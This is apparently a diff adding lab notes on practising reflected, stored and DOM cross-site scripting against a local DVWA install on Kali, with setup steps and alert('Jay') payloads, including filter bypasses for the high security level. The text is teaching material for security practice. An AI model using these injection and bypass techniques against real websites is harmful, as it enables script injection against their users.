@@ -1,0 +1,83 @@
+# Implementing XSS (Cross-site Scripting) in kali using DVWA.
+
+# To start apache2 server
+sudo service apache2 start
+
+# To check if apache2 server is running properly
+systemctl status apache2
+# if you see active (running)
+# the server is running properly
+
+# To start mysql server
+sudo service mysql start
+
+# To check if mysql server is running properly
+systemctl status mysql
+# if you see active (running)
+# the server is running properly
+
+# Now go to browser and user url
+http://127.0.0.1/dvwa/
+
+# If you are not directly prompted to login page try below steps
+
+#scroll down and click on crete database
+#if you see any errors on database connection
+#possible solutions will be
+#1. changing username and password of database in the config file
+# this file will be in folder dvwa/config
+# Opening config file to change username and password
+#sudo nano config.inc.php
+#make db_ser to user and db_password to pass
+
+# Save the file(Ctrol + O, then Enter) and Exit(Ctrl + X)
+
+# Once Databsae connection is successfull
+# Log in using username: admin and password: password
+
+# Go to DVWA Security and set it to low
+
+# Then go to XSS(REflected)
+# In the name field you can enter js query which will be executed when we click on submit
+script: <script>alert("Jay")</script>
+
+
+# Now go to XSS (Stored)
+# Enter Name and Message
+# in message you will give js query
+# once you click on submit guestbook your js query will be stored
+# and it will be executed every time you visit that page
+# you could clear all the entered query by clicking on clear guestbook
+Name: Jay
+Message (script) : <script>alert("Jay")</script>
+
+
+# Now go to XSS (DOM)
+# Choose a language and click on select
+# url will be updated
+# you can insert js query after ?default= in url which will be then executed once you press enter
+# eg. 127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert("Jay")</script>
+
+# Now again go to DVWA Security and change it to high
+# Now the above queries will not be executed as the security is set to high
+# so we need some different ways to fire our queries
+
+# XSS (Reflected)
+<img src=x onerror=alert("Jay")>
+
+# XSS (Stored)
+# as the security is set high the query in the message box will not get executed
+# so we can enter the query in name field 
+# but the problem is name field has a limit of 10 character
+# so we can bypass it by editing the html (ctrl + shift + I)
+# Once Inspection is open chage maxlength to 100
+<body onload=alert("Jay")>
+
+# XSS (DOM)
+English#<script>alert("Jay")</script>
+
+
+
+
+
+
